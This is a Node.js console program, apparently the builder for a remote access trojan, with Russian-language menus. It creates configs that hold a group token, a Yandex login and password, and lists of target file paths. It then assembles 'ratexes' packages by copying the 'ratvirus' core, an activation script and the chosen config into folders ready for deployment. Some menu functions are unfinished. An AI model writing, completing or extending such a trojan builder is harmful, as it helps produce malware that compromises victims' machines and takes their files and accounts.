const fs = require("fs-extra")
const stdio = require("stdio")

var debugmode = process.argv[2]
var forcelanguage = process.argv[3]

var configsobj = {
    configsfolderpath: `${__dirname}\\configs`,
    configs: {
        paths: [],
        names: [],
        localnames: []
    }
}

var langsobj = {
    langsfolderpath: `${__dirname}\\translations`,
    langs: {
        paths: [],
        names: [],
        localnames: [],
        translations: []
    },
    nowlagnint: 0,
    langsarray: ["-russian", "-english"]
}

var nowlang

var menu = {}

menu.clearscreen = function () {// full ready
    if (debugmode != "-debug") {
        console.clear()
    }
}
menu.mainmenu = function () {// full ready
    menu.clearscreen()
    return new Promise(function () {
        console.log(nowlang.mainmenu.top)
        stdio.ask(nowlang.mainmenu.ask).then(mainmenuanswer => {
            let inp = parseInt(mainmenuanswer, 10)
            if (inp == 1) {//
                menu.configsmenu().then(() => {
                    menu.init()
                })
            } else if (inp == 2) {
                menu.ratmenu().then(() => {
                    menu.init()
                })
            } else if (inp == 3) {
                menu.changelang().then(() => {
                    menu.init()
                })
            } else {
                menu.init()
            }
        })
    })
}

//Lang
menu.changelang = function () {// full ready
    menu.clearscreen()
    return new Promise(function (resolve) {
        console.log(nowlang.langs.changelang.top)
        console.log(`${nowlang.langs.changelang.ask.one}${langsobj.langs.localnames[langsobj.nowlagnint]}${nowlang.langs.changelang.ask.two}`)
        new Promise(function (resolve) {
            if (langsobj.langs.paths.length != 0) {
                for (let index = 0; index < langsobj.langs.paths.length; index++) {
                    console.log(`${index + 1}. ( ${langsobj.langs.localnames[index]} ) --> ${langsobj.langs.paths[index]}`)
                    //console.log(`${configsobj.configs.paths.length-1 == index}     |   ${configsobj.configs.paths.length}  |   ${index}`)
                    if (langsobj.langs.paths.length - 1 == index) {
                        resolve(true)
                    }
                }
            } else {
                console.log(nowlang.langs.changelang.langsnotfinded)
                resolve(true)
            }
        }).then(() => {
            console.log(nowlang.langs.changelang.bot)
            stdio.ask(nowlang.langs.changelang.chooselang).then((answ) => {
                let temp = parseInt(answ, 10)
                let data = `{"localname": "${langsobj.langs.localnames[temp - 1]}"}`
                fs.exists(__dirname + "\\translations\\selected.json", (exist) => {
                    if (exist) {
                        fs.remove(__dirname + "\\translations\\selected.json").then(() => {
                            fs.writeFile(__dirname + "\\translations\\selected.json", data, (err) => {
                                menu.init()
                            })
                        })
                    } else {
                        fs.writeFile(__dirname + "\\translations\\selected.json", data, (err) => {
                            menu.init()
                        })
                    }
                    process.exit(0)
                })
            })
        })
    })
}

// Configs
menu.configsprint = function () {// full ready
    return new Promise(function (resolve) {
        if (configsobj.configs.paths.length != 0) {
            for (let index = 0; index < configsobj.configs.paths.length; index++) {
                console.log(`${index + 1}. ${configsobj.configs.names[index]} ( ${configsobj.configs.localnames[index]} ) --> ${configsobj.configs.paths[index]}`)
                //console.log(`${configsobj.configs.paths.length-1 == index}     |   ${configsobj.configs.paths.length}  |   ${index}`)
                if (configsobj.configs.paths.length - 1 == index) {
                    resolve(true)
                }
            }
        } else {
            console.log(nowlang.configs.configsprint.configsnotfinded)
            resolve(true)
        }
    })
}
menu.configsmenu = function () {// full ready
    menu.clearscreen()
    //console.clear()
    console.log(nowlang.configs.configsmenu.top)
    return new Promise(function (resolve) {
        menu.configsprint().then(resofprint => {
            console.log(nowlang.configs.configsmenu.bot)
            stdio.ask(nowlang.configs.configsmenu.ask).then((answer) => {
                let intanswer = parseInt(answer, 10)
                if (intanswer == 1) {
                    menu.configcreate().then(() => {
                        menu.init()
                    })
                } else if (intanswer == 2) {

                } else if (intanswer == 3) {

                } else if (intanswer == 4) {
                    menu.init()
                } else {
                    menu.init()
                }
            })
        })
    })
}
menu.configcreate = function () {// full ready
    menu.clearscreen()
    return new Promise(function () {
        console.log(nowlang.configs.configcreate.top)
        stdio.ask(nowlang.configs.configcreate.asks.configname).then((configname) => {
            stdio.ask(nowlang.configs.configcreate.asks.localname).then((localname) => {
                stdio.ask(nowlang.configs.configcreate.asks.token).then((token) => {
                    stdio.ask(nowlang.configs.configcreate.asks.groupid).then((groupid) => {
                        let intgroupid = parseInt(groupid, 10)
                        stdio.ask(nowlang.configs.configcreate.asks.yandexlogin).then((YandexLogin) => {
                            stdio.ask(nowlang.configs.configcreate.asks.yandexpassword).then((YandexPassword) => {
                                stdio.ask(nowlang.configs.configcreate.asks.usedatabase).then((useDataBase) => {
                                    let finalconfig = { files: [], group: {}, localname: "", yandex: {} }
                                    finalconfig.localname = localname; finalconfig.group.token = token; finalconfig.group.id = intgroupid; finalconfig.yandex.login = YandexLogin; finalconfig.yandex.password = YandexPassword
                                    new Promise(function (resolve) {
                                        console.log(nowlang.configs.configcreate.asks.filesinputhelp)
                                        if (useDataBase == "Да" || useDataBase == "да" || useDataBase == "Y" || useDataBase == "y" || useDataBase == "Yes" || useDataBase == "yes") {
                                            finalconfig.files = require("./database.json")
                                        }
                                        function addpathtoconfig() {
                                            return new Promise(function (resolve) {
                                                stdio.ask("").then((a) => {
                                                    if (a == "0") {
                                                        resolve(true)
                                                    } else {
                                                        finalconfig.files[finalconfig.files.length] = a
                                                        console.log(finalconfig.files)
                                                        addpathtoconfig().then(() => { resolve(true); })
                                                    }
                                                })
                                            })
                                        }
                                        addpathtoconfig().then(() => {
                                            resolve(true)
                                        })
                                    }).then(() => {
                                        console.log(nowlang.configs.configcreate.createconfig)
                                        finalconfig = JSON.stringify(finalconfig)
                                        fs.writeFile(`./configs/${configname}.json`, finalconfig, (err) => {
                                            if (err) {
                                                console.error(err)
                                            }
                                            menu.init()
                                        })
                                    })
                                    //stdio.ask("").then((a)=>{
                                    //    
                                    //})
                                })
                            })
                        })
                    })
                })
            })
        })
    })
}
menu.configdelete = function () { // not ready

}

// Rats
menu.ratdeleting = function () { // not ready
    let ratsobj = {
        arr: []
    }
    let counter
    return new Promise(function (resolve) {
        fs.readdir("./ratexes", (err, files) => {
            if (files.length == 0) {
                resolve(true)
            } else {
                console.log("Lol")
                files.forEach(nazvratnika => {
                    fs.stat(__dirname + "/ratexes/" + nazvratnika, (err, stats) => {
                        if (stats.isDirectory()) {
                            fs.exists(__dirname + "/ratexes/" + nazvratnika + "/LICENSE.md", exist => {
                                if (exist) {
                                    console.log("Lol")
                                    let localnamerat = nazvratnika.split("/")
                                    ratsobj.arr[ratsobj.arr.length] = [nazvratnika, localnamerat]
                                }
                            })
                        }
                    })
                    counter++
                    if (counter == files.length - 1) {
                        resolve(ratsobj)
                    }
                })
            }
        })
    }).then(() => {
        console.log(ratsobj)
    })
}
menu.ratcreating = function () { // full ready
    menu.clearscreen()

    return new Promise(function (resolve) {
        console.log(nowlang.rats.ratcreating.top)
        menu.configsprint().then(() => {
            console.log(nowlang.rats.ratcreating.bot)


            stdio.ask(nowlang.rats.ratcreating.asks.selectedconfig).then(selectedconfig => {
                let intselectedconfig = parseInt(selectedconfig, 10)
                stdio.ask(nowlang.rats.ratcreating.asks.ratfilename).then(ratfilename => {
                    fs.readFile(`${__dirname}\\ratresources\\ratvirus\\ratcore.js`, 'utf8', function (err, contents) {
                        if (!err) {
                            fs.exists(`${__dirname}\\ratexes`, existratsfolder => {
                                if (!existratsfolder) {
                                    fs.mkdir(`${__dirname}\\ratexes`, err => {
                                        if (err) {
                                            console.error(err)
                                        }
                                    })
                                }
                                fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}`, err => {
                                    fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}\\virus`, err => {
                                        fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}\\activation`, err => {
                                            // СОЗДАНО, ПЕРЕЙДИТЕ К АКТИВАЦИИ
                                            let resourcescopy = [['./ratresources/ratactivation/node_modules', `${__dirname}\\ratexes\\${ratfilename}\\activation\\node_modules`], ['./ratresources/ratactivation/ratactivationcore.js', `${__dirname}\\ratexes\\${ratfilename}\\activation\\ratactivationcore.js`], ['./ratresources/ratactivation/start.bat', `${__dirname}\\ratexes\\${ratfilename}\\activation\\start.bat`], [`${configsobj.configs.paths[intselectedconfig - 1]}`, `${__dirname}\\ratexes\\${ratfilename}\\activation\\config.json`], [`./ratresources/ratvirus/node_modules`, `${__dirname}\\ratexes\\${ratfilename}\\virus\\node_modules`], ["./LICENSE.md", `${__dirname}\\ratexes\\${ratfilename}\\LICENSE.md`]]

                                            resourcescopy.forEach(arr => {
                                                fs.copy(arr[0], arr[1], err => {
                                                    if (err) {
                                                        if (debugmode == "-debug") {
                                                            console.log("[CompileERROR] From: " + arr[0] + "\n To: " + arr[1])
                                                        }
                                                    }
                                                })
                                            })
                                            resolve()
                                        })
                                    })
                                })
                            })
                        } else {

                        }
                    });
                })
            })
        })
    })
}
menu.ratmenu = function () { // full ready
    menu.clearscreen()
    return new Promise(function () {
        console.log(nowlang.rats.ratmenu.top)
        stdio.ask(nowlang.rats.ratmenu.ask).then(answer => {
            let intanswer = parseInt(answer, 10)

            if (intanswer == 1) {
                menu.ratcreating().then(() => {
                    menu.init()
                })
            } else if (intanswer == 2) {
                menu.ratdeleting().then(() => {
                    menu.init()
                })
            } else {
                menu.init()
            }
        })
    })
}

// Sys
menu.reloadlangs = function () {// full ready
    return new Promise(function (resolve, reject) {
        fs.readdir(langsobj.langsfolderpath, (err, files) => {
            new Promise(function (resolve, reject) {
                if (files.length == 0) {
                    resolve(true)
                } else {
                    langsobj.langs.paths = []
                    langsobj.langs.names = []
                    fs.exists(__dirname + "\\translations\\selected.json", (IsHereSelectedLang) => {
                        let filestotal = files.length
                        if (IsHereSelectedLang) {
                            filestotal--
                        }
                        for (let index = 0; index < files.length; index++) {
                            console.log(`lol kek ${index} is ${index >= files.length - 1}  files: ${filestotal}`)
                            let lastchar = files[index].split(".")
                            fs.stat(`${langsobj.langsfolderpath}/${files[index]}`, (err, stats) => {
                                if (stats.isFile() == true) {

                                    if (lastchar[lastchar.length - 1] == "json" && lastchar[0] != "selected") {
                                        langsobj.langs.paths[langsobj.langs.paths.length] = `${langsobj.langsfolderpath}/${files[index]}`
                                        let conf = require(`${langsobj.langs.paths[langsobj.langs.paths.length - 1]}`)
                                        langsobj.langs.localnames[langsobj.langs.names.length] = conf.localname
                                        langsobj.langs.names[langsobj.langs.names.length] = lastchar[0]
                                        langsobj.langs.translations[langsobj.langs.translations.length] = conf.translation

                                        if (!IsHereSelectedLang) {
                                            if (conf.localname == "Русский") {
                                                langsobj.nowlagnint = langsobj.langs.paths.length - 1
                                                console.log(`${langsobj.langs.translations[langsobj.nowlagnint]} Установлен язык Русский`)
                                                nowlang = langsobj.langs.translations[langsobj.nowlagnint]
                                                if (index >= files.length - 1) {
                                                    resolve(true)
                                                }
                                            }
                                        } else if (forcelanguage == undefined) {
                                            let selectedlang = require(__dirname + "\\translations\\selected.json")
                                            console.log(conf.localname == selectedlang.localname)
                                            if (conf.localname == selectedlang.localname) {
                                                langsobj.nowlagnint = langsobj.langs.paths.length - 1
                                                console.log(`${langsobj.langs.translations[langsobj.nowlagnint]} Установлен язык ${selectedlang.localname}  SELECTED`)
                                                nowlang = langsobj.langs.translations[langsobj.nowlagnint]
                                            }
                                            if (index >= files.length - 1) {
                                                resolve(true)
                                            }
                                        } else {
                                            if (conf.argname == forcelanguage) {
                                                langsobj.nowlagnint = langsobj.langs.paths.length - 1
                                                console.log(`${langsobj.langs.translations[langsobj.nowlagnint]} Установлен язык ${langsobj.langs.localnames[langsobj.nowlagnint]}  FORCESELECTED   `)
                                                nowlang = langsobj.langs.translations[langsobj.nowlagnint]
                                            }
                                            if (index >= files.length - 1) {
                                                resolve(true)
                                            }
                                        }
                                    } else {
                                        if (index >= files.length - 1) {
                                            resolve(true)
                                        }
                                    }

                                } else {
                                    if (index >= files.length - 1) {
                                        resolve(true)
                                    }
                                }

                            })
                        }
                    })

                }

            }).then(result => {
                resolve(true)
            })
        })
    })
}
menu.reloadconfigs = function () {// full ready
    return new Promise(function (resolve, reject) {
        fs.readdir(configsobj.configsfolderpath, (err, files) => {
            new Promise(function (resolve, reject) {
                if (files.length == 0) {
                    resolve(true)
                } else {
                    configsobj.configs.paths = []
                    configsobj.configs.names = []
                    for (let index = 0; index < files.length; index++) {
                        fs.stat(`${configsobj.configsfolderpath}/${files[index]}`, (err, stats) => {
                            if (stats.isFile() == true) {
                                let lastchar = files[index].split(".")
                                if (lastchar[lastchar.length - 1] == "json") {
                                    configsobj.configs.paths[configsobj.configs.paths.length] = `${configsobj.configsfolderpath}/${files[index]}`
                                    let conf = require(`${configsobj.configs.paths[configsobj.configs.paths.length - 1]}`)
                                    configsobj.configs.localnames[configsobj.configs.names.length] = conf.localname
                                    configsobj.configs.names[configsobj.configs.names.length] = lastchar[0]
                                    if (index >= files.length - 1) {
                                        resolve(true)
                                    }
                                } else {
                                    if (index >= files.length - 1) {
                                        resolve(true)
                                    }
                                }
                            } else {
                                if (index >= files.length - 1) {
                                    resolve(true)
                                }
                            }
                        })
                    }
                }

            }).then(result => {
                resolve(true)
            })
        })
    })
}
menu.init = function () {// full ready
    menu.reloadconfigs().then(isGoodScanned => {
        if (isGoodScanned) {
            fs.exists(langsobj.langsfolderpath, isHereLangsFolder => {
                if (isHereLangsFolder) {
                    menu.reloadlangs().then((ans) => {
                        if (ans) {
                            menu.mainmenu()
                        }
                    })
                }
            })
        } else {

        }
    })
}
fs.exists(configsobj.configsfolderpath, isHereConfigsFolder => {
    new Promise((resolve) => {
        let counter = 0
        let newarr = process.argv
        newarr.shift()
        newarr.shift()
        if (newarr.length != 0) {
            newarr.forEach(element => {
                console.log("ARGV LOADING   " + element)
                if (element != "node" || element != "core.js") {
                    if (element == "-debug") {
                        debugmode = element
                    }
                    if (langsobj.langsarray.includes(element)) {
                        forcelanguage = element
                    }
                }
                counter++
                if (process.argv.length == counter) {
                    resolve(true)
                }
            })
        } else {
            resolve(true)
        }
    }).then(() => {
        console.log(`Debug: ${debugmode} | Language Force selected: ${forcelanguage}`)
        if (isHereConfigsFolder) {
            menu.init()
        } else {
            console.log("config folder non finded " + __dirname)
            fs.mkdir(configsobj.configsfolderpath, err => {
                if (err) {

                } else {
                    console.log("config folder has been created")
                    menu.init()
                }
            })
        }
    })
})